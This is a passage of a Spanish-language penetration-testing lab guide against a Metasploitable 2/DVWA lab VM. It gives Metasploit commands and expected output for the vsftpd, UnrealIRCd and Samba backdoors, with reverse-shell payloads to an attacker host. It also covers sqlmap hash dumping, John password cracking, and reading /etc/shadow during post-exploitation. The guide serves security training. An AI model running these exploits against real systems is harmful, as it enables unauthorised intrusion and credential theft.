+<span id="cb43-311"><a href="#cb43-311" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/ftp/vsftpd_234_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">RPORT</span> 21</span>
+<span id="cb43-312"><a href="#cb43-312" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-313"><a href="#cb43-313" aria-hidden="true" tabindex="-1"></a><span class="co"># Ejecutar exploit</span></span>
+<span id="cb43-314"><a href="#cb43-314" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/ftp/vsftpd_234_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> run</span>
+<span id="cb43-315"><a href="#cb43-315" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-316"><a href="#cb43-316" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-317"><a href="#cb43-317" aria-hidden="true" tabindex="-1"></a>**Output esperado**:</span>
+<span id="cb43-318"><a href="#cb43-318" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-319"><a href="#cb43-319" aria-hidden="true" tabindex="-1"></a><span class="in">[*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4)</span></span>
+<span id="cb43-320"><a href="#cb43-320" aria-hidden="true" tabindex="-1"></a><span class="in">[*] 192.168.56.102:21 - USER: 331 Please specify the password.</span></span>
+<span id="cb43-321"><a href="#cb43-321" aria-hidden="true" tabindex="-1"></a><span class="in">[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...</span></span>
+<span id="cb43-322"><a href="#cb43-322" aria-hidden="true" tabindex="-1"></a><span class="in">[+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root)</span></span>
+<span id="cb43-323"><a href="#cb43-323" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Found shell.</span></span>
+<span id="cb43-324"><a href="#cb43-324" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Command shell session 1 opened (192.168.56.101:35174 -&gt; 192.168.56.102:6200)</span></span>
+<span id="cb43-325"><a href="#cb43-325" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-326"><a href="#cb43-326" aria-hidden="true" tabindex="-1"></a><span class="in">id</span></span>
+<span id="cb43-327"><a href="#cb43-327" aria-hidden="true" tabindex="-1"></a><span class="in">uid=0(root) gid=0(root) groups=0(root)</span></span>
+<span id="cb43-328"><a href="#cb43-328" aria-hidden="true" tabindex="-1"></a><span class="in">whoami</span></span>
+<span id="cb43-329"><a href="#cb43-329" aria-hidden="true" tabindex="-1"></a><span class="in">root</span></span>
+<span id="cb43-330"><a href="#cb43-330" aria-hidden="true" tabindex="-1"></a><span class="in">hostname</span></span>
+<span id="cb43-331"><a href="#cb43-331" aria-hidden="true" tabindex="-1"></a><span class="in">metasploitable</span></span>
+<span id="cb43-332"><a href="#cb43-332" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-333"><a href="#cb43-333" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-334"><a href="#cb43-334" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-335"><a href="#cb43-335" aria-hidden="true" tabindex="-1"></a><span class="co"># Guardar evidencia</span></span>
+<span id="cb43-336"><a href="#cb43-336" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span> <span class="op">&gt;</span> /tmp/vector1_evidencia.txt</span>
+<span id="cb43-337"><a href="#cb43-337" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd <span class="op">&gt;&gt;</span> /tmp/vector1_evidencia.txt</span>
+<span id="cb43-338"><a href="#cb43-338" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-339"><a href="#cb43-339" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-340"><a href="#cb43-340" aria-hidden="true" tabindex="-1"></a><span class="fu">### 3.2 Vector 2 — UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)</span></span>
+<span id="cb43-341"><a href="#cb43-341" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-342"><a href="#cb43-342" aria-hidden="true" tabindex="-1"></a>**Descripción**: UnrealIRCd 3.2.8.1 fue distribuido con una backdoor que permite ejecución de comandos arbitrarios enviando <span class="in">`AB`</span> seguido del comando al puerto IRC.</span>
+<span id="cb43-343"><a href="#cb43-343" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-344"><a href="#cb43-344" aria-hidden="true" tabindex="-1"></a>**CVSS v2**: 7.5 (Alta) | **CWE**: CWE-78 (OS Command Injection)</span>
+<span id="cb43-345"><a href="#cb43-345" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-346"><a href="#cb43-346" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-347"><a href="#cb43-347" aria-hidden="true" tabindex="-1"></a><span class="co"># En msfconsole</span></span>
+<span id="cb43-348"><a href="#cb43-348" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> search unrealircd</span>
+<span id="cb43-349"><a href="#cb43-349" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-350"><a href="#cb43-350" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use exploit/unix/irc/unreal_ircd_3281_backdoor</span>
+<span id="cb43-351"><a href="#cb43-351" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-352"><a href="#cb43-352" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/irc/unreal_ircd_3281_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> show <span class="ex">options</span></span>
+<span id="cb43-353"><a href="#cb43-353" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-354"><a href="#cb43-354" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/irc/unreal_ircd_3281_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">RHOSTS</span> 192.168.56.102</span>
+<span id="cb43-355"><a href="#cb43-355" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/irc/unreal_ircd_3281_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">RPORT</span> 6667</span>
+<span id="cb43-356"><a href="#cb43-356" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-357"><a href="#cb43-357" aria-hidden="true" tabindex="-1"></a><span class="co"># Configurar payload de reverse shell</span></span>
+<span id="cb43-358"><a href="#cb43-358" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/irc/unreal_ircd_3281_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">PAYLOAD</span> cmd/unix/reverse</span>
+<span id="cb43-359"><a href="#cb43-359" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-360"><a href="#cb43-360" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/irc/unreal_ircd_3281_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">LHOST</span> 192.168.56.101</span>
+<span id="cb43-361"><a href="#cb43-361" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/irc/unreal_ircd_3281_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">LPORT</span> 4444</span>
+<span id="cb43-362"><a href="#cb43-362" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-363"><a href="#cb43-363" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">unix/irc/unreal_ircd_3281_backdoor</span><span class="kw">)</span><span class="op">&gt;</span> run</span>
+<span id="cb43-364"><a href="#cb43-364" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-365"><a href="#cb43-365" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-366"><a href="#cb43-366" aria-hidden="true" tabindex="-1"></a>**Output esperado**:</span>
+<span id="cb43-367"><a href="#cb43-367" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-368"><a href="#cb43-368" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Started reverse TCP double handler on 192.168.56.101:4444</span></span>
+<span id="cb43-369"><a href="#cb43-369" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Connected to 192.168.56.102:6667...</span></span>
+<span id="cb43-370"><a href="#cb43-370" aria-hidden="true" tabindex="-1"></a><span class="in">    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...</span></span>
+<span id="cb43-371"><a href="#cb43-371" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Sending backdoor command...</span></span>
+<span id="cb43-372"><a href="#cb43-372" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Accepted the first client connection...</span></span>
+<span id="cb43-373"><a href="#cb43-373" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Accepted the second client connection...</span></span>
+<span id="cb43-374"><a href="#cb43-374" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Command: echo PqOLBNomqzxXLuQB;</span></span>
+<span id="cb43-375"><a href="#cb43-375" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Writing to socket A</span></span>
+<span id="cb43-376"><a href="#cb43-376" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Writing to socket B</span></span>
+<span id="cb43-377"><a href="#cb43-377" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Reading from sockets...</span></span>
+<span id="cb43-378"><a href="#cb43-378" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Reading from socket B</span></span>
+<span id="cb43-379"><a href="#cb43-379" aria-hidden="true" tabindex="-1"></a><span class="in">[*] B: "PqOLBNomqzxXLuQB\r\n"</span></span>
+<span id="cb43-380"><a href="#cb43-380" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Matching...</span></span>
+<span id="cb43-381"><a href="#cb43-381" aria-hidden="true" tabindex="-1"></a><span class="in">[*] A is input...</span></span>
+<span id="cb43-382"><a href="#cb43-382" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Command shell session 2 opened (192.168.56.101:4444 -&gt; 192.168.56.102:32888)</span></span>
+<span id="cb43-383"><a href="#cb43-383" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-384"><a href="#cb43-384" aria-hidden="true" tabindex="-1"></a><span class="in">id</span></span>
+<span id="cb43-385"><a href="#cb43-385" aria-hidden="true" tabindex="-1"></a><span class="in">uid=1001(ircd) gid=1001(ircd)</span></span>
+<span id="cb43-386"><a href="#cb43-386" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-387"><a href="#cb43-387" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-388"><a href="#cb43-388" aria-hidden="true" tabindex="-1"></a><span class="fu">### 3.3 Vector 3 — Samba 3.0.20 "username map script" (CVE-2007-2447)</span></span>
+<span id="cb43-389"><a href="#cb43-389" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-390"><a href="#cb43-390" aria-hidden="true" tabindex="-1"></a>**Descripción**: Samba 3.0.0–3.0.25rc3 permite inyección de comandos en el campo de usuario MS-RPC cuando <span class="in">`username map script`</span> está configurado. Produce shell de root directamente.</span>
+<span id="cb43-391"><a href="#cb43-391" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-392"><a href="#cb43-392" aria-hidden="true" tabindex="-1"></a>**CVSS v2**: 10.0 (Crítico) | **CWE**: CWE-20 (Improper Input Validation)</span>
+<span id="cb43-393"><a href="#cb43-393" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-394"><a href="#cb43-394" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-395"><a href="#cb43-395" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> search samba usermap</span>
+<span id="cb43-396"><a href="#cb43-396" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-397"><a href="#cb43-397" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span><span class="op">&gt;</span> use exploit/multi/samba/usermap_script</span>
+<span id="cb43-398"><a href="#cb43-398" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-399"><a href="#cb43-399" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">multi/samba/usermap_script</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">RHOSTS</span> 192.168.56.102</span>
+<span id="cb43-400"><a href="#cb43-400" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">multi/samba/usermap_script</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">LHOST</span> 192.168.56.101</span>
+<span id="cb43-401"><a href="#cb43-401" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">multi/samba/usermap_script</span><span class="kw">)</span><span class="op">&gt;</span> set <span class="ex">PAYLOAD</span> cmd/unix/reverse</span>
+<span id="cb43-402"><a href="#cb43-402" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-403"><a href="#cb43-403" aria-hidden="true" tabindex="-1"></a><span class="ex">msf6</span> exploit<span class="er">(</span><span class="ex">multi/samba/usermap_script</span><span class="kw">)</span><span class="op">&gt;</span> run</span>
+<span id="cb43-404"><a href="#cb43-404" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-405"><a href="#cb43-405" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-406"><a href="#cb43-406" aria-hidden="true" tabindex="-1"></a>**Output esperado**:</span>
+<span id="cb43-407"><a href="#cb43-407" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-408"><a href="#cb43-408" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Started reverse TCP double handler on 192.168.56.101:4444</span></span>
+<span id="cb43-409"><a href="#cb43-409" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Accepted the first client connection...</span></span>
+<span id="cb43-410"><a href="#cb43-410" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Accepted the second client connection...</span></span>
+<span id="cb43-411"><a href="#cb43-411" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Command: echo PqOLBNomqzxXLuQB;</span></span>
+<span id="cb43-412"><a href="#cb43-412" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Writing to socket A</span></span>
+<span id="cb43-413"><a href="#cb43-413" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Writing to socket B</span></span>
+<span id="cb43-414"><a href="#cb43-414" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Reading from sockets...</span></span>
+<span id="cb43-415"><a href="#cb43-415" aria-hidden="true" tabindex="-1"></a><span class="in">[*] Command shell session 3 opened (192.168.56.101:4444 -&gt; 192.168.56.102:55674)</span></span>
+<span id="cb43-416"><a href="#cb43-416" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-417"><a href="#cb43-417" aria-hidden="true" tabindex="-1"></a><span class="in">id</span></span>
+<span id="cb43-418"><a href="#cb43-418" aria-hidden="true" tabindex="-1"></a><span class="in">uid=0(root) gid=0(root)</span></span>
+<span id="cb43-419"><a href="#cb43-419" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-420"><a href="#cb43-420" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-421"><a href="#cb43-421" aria-hidden="true" tabindex="-1"></a><span class="fu">### 3.4 Vector 4 (Bonus) — DVWA SQL Injection + File Upload</span></span>
+<span id="cb43-422"><a href="#cb43-422" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-423"><a href="#cb43-423" aria-hidden="true" tabindex="-1"></a>**Descripción**: DVWA (Damn Vulnerable Web Application) expone múltiples vulnerabilidades web. Utilizaremos SQLi para extraer credenciales y File Upload para subir una webshell.</span>
+<span id="cb43-424"><a href="#cb43-424" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-425"><a href="#cb43-425" aria-hidden="true" tabindex="-1"></a>**Pre-requisito**: Abrir <span class="in">`http://192.168.56.102/dvwa/`</span> en el navegador, iniciar sesión con <span class="in">`admin/password`</span>, ajustar el nivel de seguridad a "Low".</span>
+<span id="cb43-426"><a href="#cb43-426" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-427"><a href="#cb43-427" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-428"><a href="#cb43-428" aria-hidden="true" tabindex="-1"></a><span class="co"># 4a. Extracción de credenciales con SQLmap</span></span>
+<span id="cb43-429"><a href="#cb43-429" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
+<span id="cb43-430"><a href="#cb43-430" aria-hidden="true" tabindex="-1"></a>       <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=&lt;tu_session_id&gt;"</span> <span class="dt">\</span></span>
+<span id="cb43-431"><a href="#cb43-431" aria-hidden="true" tabindex="-1"></a>       <span class="at">--dbs</span> <span class="at">--batch</span></span>
+<span id="cb43-432"><a href="#cb43-432" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-433"><a href="#cb43-433" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver tablas de la base de datos dvwa</span></span>
+<span id="cb43-434"><a href="#cb43-434" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
+<span id="cb43-435"><a href="#cb43-435" aria-hidden="true" tabindex="-1"></a>       <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=&lt;tu_session_id&gt;"</span> <span class="dt">\</span></span>
+<span id="cb43-436"><a href="#cb43-436" aria-hidden="true" tabindex="-1"></a>       <span class="at">-D</span> dvwa <span class="at">--tables</span> <span class="at">--batch</span></span>
+<span id="cb43-437"><a href="#cb43-437" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-438"><a href="#cb43-438" aria-hidden="true" tabindex="-1"></a><span class="co"># Volcar tabla de usuarios</span></span>
+<span id="cb43-439"><a href="#cb43-439" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-u</span> <span class="st">"http://</span><span class="va">$TARGET</span><span class="st">/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="dt">\</span></span>
+<span id="cb43-440"><a href="#cb43-440" aria-hidden="true" tabindex="-1"></a>       <span class="at">--cookie</span><span class="op">=</span><span class="st">"security=low; PHPSESSID=&lt;tu_session_id&gt;"</span> <span class="dt">\</span></span>
+<span id="cb43-441"><a href="#cb43-441" aria-hidden="true" tabindex="-1"></a>       <span class="at">-D</span> dvwa <span class="at">-T</span> users <span class="at">--dump</span> <span class="at">--batch</span></span>
+<span id="cb43-442"><a href="#cb43-442" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-443"><a href="#cb43-443" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-444"><a href="#cb43-444" aria-hidden="true" tabindex="-1"></a>**Output esperado**:</span>
+<span id="cb43-445"><a href="#cb43-445" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-446"><a href="#cb43-446" aria-hidden="true" tabindex="-1"></a><span class="in">Database: dvwa</span></span>
+<span id="cb43-447"><a href="#cb43-447" aria-hidden="true" tabindex="-1"></a><span class="in">Table: users</span></span>
+<span id="cb43-448"><a href="#cb43-448" aria-hidden="true" tabindex="-1"></a><span class="in">[5 entries]</span></span>
+<span id="cb43-449"><a href="#cb43-449" aria-hidden="true" tabindex="-1"></a><span class="in">+---------+---------+----------------------------------+----------+</span></span>
+<span id="cb43-450"><a href="#cb43-450" aria-hidden="true" tabindex="-1"></a><span class="in">| user_id | user    | password                         | last_name|</span></span>
+<span id="cb43-451"><a href="#cb43-451" aria-hidden="true" tabindex="-1"></a><span class="in">+---------+---------+----------------------------------+----------+</span></span>
+<span id="cb43-452"><a href="#cb43-452" aria-hidden="true" tabindex="-1"></a><span class="in">| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | admin    |</span></span>
+<span id="cb43-453"><a href="#cb43-453" aria-hidden="true" tabindex="-1"></a><span class="in">| 2       | gordonb | e99a18c428cb38d5f260853678922e03 | Brown    |</span></span>
+<span id="cb43-454"><a href="#cb43-454" aria-hidden="true" tabindex="-1"></a><span class="in">| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me       |</span></span>
+<span id="cb43-455"><a href="#cb43-455" aria-hidden="true" tabindex="-1"></a><span class="in">| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso  |</span></span>
+<span id="cb43-456"><a href="#cb43-456" aria-hidden="true" tabindex="-1"></a><span class="in">| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith    |</span></span>
+<span id="cb43-457"><a href="#cb43-457" aria-hidden="true" tabindex="-1"></a><span class="in">+---------+---------+----------------------------------+----------+</span></span>
+<span id="cb43-458"><a href="#cb43-458" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-459"><a href="#cb43-459" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-460"><a href="#cb43-460" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-461"><a href="#cb43-461" aria-hidden="true" tabindex="-1"></a><span class="co"># Crackear hashes MD5 con john</span></span>
+<span id="cb43-462"><a href="#cb43-462" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"admin:5f4dcc3b5aa765d61d8327deb882cf99"</span> <span class="op">&gt;</span> dvwa_hashes.txt</span>
+<span id="cb43-463"><a href="#cb43-463" aria-hidden="true" tabindex="-1"></a><span class="ex">john</span> dvwa_hashes.txt <span class="at">--format</span><span class="op">=</span>Raw-MD5 <span class="at">--wordlist</span><span class="op">=</span>/usr/share/wordlists/rockyou.txt</span>
+<span id="cb43-464"><a href="#cb43-464" aria-hidden="true" tabindex="-1"></a><span class="co"># Resultado: password =&gt; password</span></span>
+<span id="cb43-465"><a href="#cb43-465" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-466"><a href="#cb43-466" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-467"><a href="#cb43-467" aria-hidden="true" tabindex="-1"></a>**Entregable Fase 3**: Para cada vector documentar: módulo MSF utilizado, opciones configuradas, output de <span class="in">`id`</span>/<span class="in">`whoami`</span>, captura de pantalla o archivo de log guardado.</span>
+<span id="cb43-468"><a href="#cb43-468" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-469"><a href="#cb43-469" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-470"><a href="#cb43-470" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-471"><a href="#cb43-471" aria-hidden="true" tabindex="-1"></a><span class="fu">## Fase 4: Post-Explotación</span></span>
+<span id="cb43-472"><a href="#cb43-472" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-473"><a href="#cb43-473" aria-hidden="true" tabindex="-1"></a>**Objetivo**: Desde el acceso obtenido, realizar escalada de privilegios, establecer persistencia, moverse lateralmente y simular exfiltración de datos.</span>
+<span id="cb43-474"><a href="#cb43-474" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-475"><a href="#cb43-475" aria-hidden="true" tabindex="-1"></a><span class="at">&gt; Trabajaremos desde la sesión obtenida en el Vector 1 (root) o Vector 2 (ircd). Hacer </span><span class="in">`background`</span><span class="at"> de la sesión activa para seguir desde msfconsole.</span></span>
+<span id="cb43-476"><a href="#cb43-476" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-477"><a href="#cb43-477" aria-hidden="true" tabindex="-1"></a><span class="fu">### 4.1 Reconocimiento del Sistema Comprometido</span></span>
+<span id="cb43-478"><a href="#cb43-478" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-479"><a href="#cb43-479" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-480"><a href="#cb43-480" aria-hidden="true" tabindex="-1"></a><span class="co"># Desde shell en el objetivo</span></span>
+<span id="cb43-481"><a href="#cb43-481" aria-hidden="true" tabindex="-1"></a><span class="co"># Información del sistema</span></span>
+<span id="cb43-482"><a href="#cb43-482" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-a</span></span>
+<span id="cb43-483"><a href="#cb43-483" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/issue</span>
+<span id="cb43-484"><a href="#cb43-484" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /proc/version</span>
+<span id="cb43-485"><a href="#cb43-485" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-486"><a href="#cb43-486" aria-hidden="true" tabindex="-1"></a><span class="co"># Usuarios en el sistema</span></span>
+<span id="cb43-487"><a href="#cb43-487" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/passwd <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> nologin <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-v</span> false</span>
+<span id="cb43-488"><a href="#cb43-488" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /etc/shadow</span>
+<span id="cb43-489"><a href="#cb43-489" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-490"><a href="#cb43-490" aria-hidden="true" tabindex="-1"></a><span class="co"># Procesos en ejecución</span></span>
+<span id="cb43-491"><a href="#cb43-491" aria-hidden="true" tabindex="-1"></a><span class="fu">ps</span> aux</span>
+<span id="cb43-492"><a href="#cb43-492" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-493"><a href="#cb43-493" aria-hidden="true" tabindex="-1"></a><span class="co"># Conexiones de red activas</span></span>
+<span id="cb43-494"><a href="#cb43-494" aria-hidden="true" tabindex="-1"></a><span class="fu">netstat</span> <span class="at">-tulpn</span></span>
+<span id="cb43-495"><a href="#cb43-495" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-496"><a href="#cb43-496" aria-hidden="true" tabindex="-1"></a><span class="co"># Archivos SUID — potenciales vectores de escalada</span></span>
+<span id="cb43-497"><a href="#cb43-497" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-perm</span> <span class="at">-4000</span> <span class="at">-type</span> f <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span>
+<span id="cb43-498"><a href="#cb43-498" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-499"><a href="#cb43-499" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-500"><a href="#cb43-500" aria-hidden="true" tabindex="-1"></a>**Output esperado**:</span>
+<span id="cb43-501"><a href="#cb43-501" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-502"><a href="#cb43-502" aria-hidden="true" tabindex="-1"></a><span class="in">Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686</span></span>
+<span id="cb43-503"><a href="#cb43-503" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-504"><a href="#cb43-504" aria-hidden="true" tabindex="-1"></a><span class="in"># /etc/passwd (extracto)</span></span>
+<span id="cb43-505"><a href="#cb43-505" aria-hidden="true" tabindex="-1"></a><span class="in">root:x:0:0:root:/root:/bin/bash</span></span>
+<span id="cb43-506"><a href="#cb43-506" aria-hidden="true" tabindex="-1"></a><span class="in">msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</span></span>
+<span id="cb43-507"><a href="#cb43-507" aria-hidden="true" tabindex="-1"></a><span class="in">postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span></span>
+<span id="cb43-508"><a href="#cb43-508" aria-hidden="true" tabindex="-1"></a><span class="in">user:x:1001:1001:just a user,111,,:/home/user:/bin/bash</span></span>
+<span id="cb43-509"><a href="#cb43-509" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-510"><a href="#cb43-510" aria-hidden="true" tabindex="-1"></a><span class="in"># Archivos SUID encontrados</span></span>
+<span id="cb43-511"><a href="#cb43-511" aria-hidden="true" tabindex="-1"></a><span class="in">/bin/ping</span></span>
+<span id="cb43-512"><a href="#cb43-512" aria-hidden="true" tabindex="-1"></a><span class="in">/sbin/mount.nfs</span></span>
+<span id="cb43-513"><a href="#cb43-513" aria-hidden="true" tabindex="-1"></a><span class="in">/usr/bin/nmap  &lt;--- SUID en versión antigua = escalada a root</span></span>
+<span id="cb43-514"><a href="#cb43-514" aria-hidden="true" tabindex="-1"></a><span class="in">/usr/bin/sudo</span></span>
+<span id="cb43-515"><a href="#cb43-515" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-516"><a href="#cb43-516" aria-hidden="true" tabindex="-1"></a></span>
